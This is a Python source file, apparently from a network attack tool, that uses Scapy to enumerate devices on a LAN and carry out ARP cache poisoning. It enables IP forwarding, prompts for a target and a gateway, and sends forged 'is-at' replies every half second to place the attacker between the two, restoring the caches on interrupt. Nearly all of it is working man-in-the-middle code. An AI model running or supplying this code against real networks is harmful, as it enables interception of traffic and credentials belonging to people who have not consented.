from . import *

def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=1, verbose=0)
    if ans:
        return ans[0][1].src
    return None

def arp_spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    Accomplished by changing the ARP Cache of target_ip (Cache Poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("{} Sent to {} : {} is-at {}".format(M_SUCCESS, target_ip, host_ip, self_mac))

def arp_spoof_restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("{} Sent to {} : {} is-at {}".format(M_SUCCESS, target_ip, host_ip, host_mac))

def get_device_info(ip):
    """
    Get device information (MAC address and hostname) for a given IP address.
    """
    mac = get_mac(ip)
    if mac:
        try:    
            hostname = socket.gethostbyaddr(ip)[0]
        except socket.herror:
            hostname = None
        return ip, mac, hostname
    return ip, None, None


def enumerate_lan(net_info: dict) -> dict:
    """
    @brief Enumeration Network Devices
    @param net_info: network information
    @return: dict: {ipv4: {'ipv4': ..., 'mac': ..., 'hostname': ...}}
    """
    
    lan_devices = {}
    subnetmask_prefix_len = get_subnetmask_prefix_len(net_info['subnetmask'], False)
    print(f'{M_INFO} Enumerating {SUBNET_SIZE ** subnetmask_prefix_len} LAN devices on {net_info["net_ipv4"]}/{get_subnetmask_prefix_len(net_info["subnetmask"])}')
    
    ip_list = []
    for i in range(SUBNET_SIZE ** subnetmask_prefix_len):
        ipv4 = net_info['net_ipv4'].split('.')
        ipv4[1] = str(i // SUBNET_SIZE // SUBNET_SIZE)
        ipv4[2] = str(i // SUBNET_SIZE)
        ipv4[3] = str(i % SUBNET_SIZE)
        ipv4 = '.'.join(ipv4)
        ip_list.append(ipv4)
    
    try:
        # Use ThreadPoolExecutor for parallel requests
        with ThreadPoolExecutor(max_workers=MAX_POOL_THREAD_WORKERS) as executor:
            future_to_ip = {executor.submit(get_device_info, ip): ip for ip in ip_list}
            for future in as_completed(future_to_ip):
                ip = future_to_ip[future]
                try:
                    ip, mac, hostname = future.result()
                    if mac:
                        lan_devices[ip] = {'ipv4': ip, 'mac': mac, 'hostname': hostname}
                        print(f'{M_JSON} {lan_devices[ip]}')
                except Exception as exc:
                    print(f'{M_ERROR} Error fetching data for {ip}: {exc}')
    except KeyboardInterrupt:
        print(f"{M_ERROR} Detected CTRL+C!")
    finally:
        return lan_devices
    
def arp_spoofing(net_info: dict):
    """
    @brief ARP spoofing
    @param net_info: network information
    """

    global argv

    target_ipv4 = ''
    host_ipv4 = ''
    try:
        # Enable IP Forwarding
        enable_ip_route()

        print(f'{M_IMPORTANT} ARP Cache Poisoning:')
        target_ipv4 = input_ipv4('Target: ')
        host_ipv4 = input_ipv4('Host: ', net_info['gateway'])
        print("Target:", target_ipv4)
        print("Host:", host_ipv4)

        while True:
            # Telling the `target` that we are the `host`
            arp_spoof(target_ipv4, host_ipv4, not argv.quiet)
            # Telling the `host` that we are the `target`
            arp_spoof(host_ipv4, target_ipv4, not argv.quiet)
            # sleep for one second
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"{M_ERROR} Detected CTRL+C! restoring the network, please wait...")
        arp_spoof_restore(host_ipv4, target_ipv4)
        arp_spoof_restore(target_ipv4, host_ipv4)
    except Exception as e:
        print(f"{M_ERROR} Error: {e}")



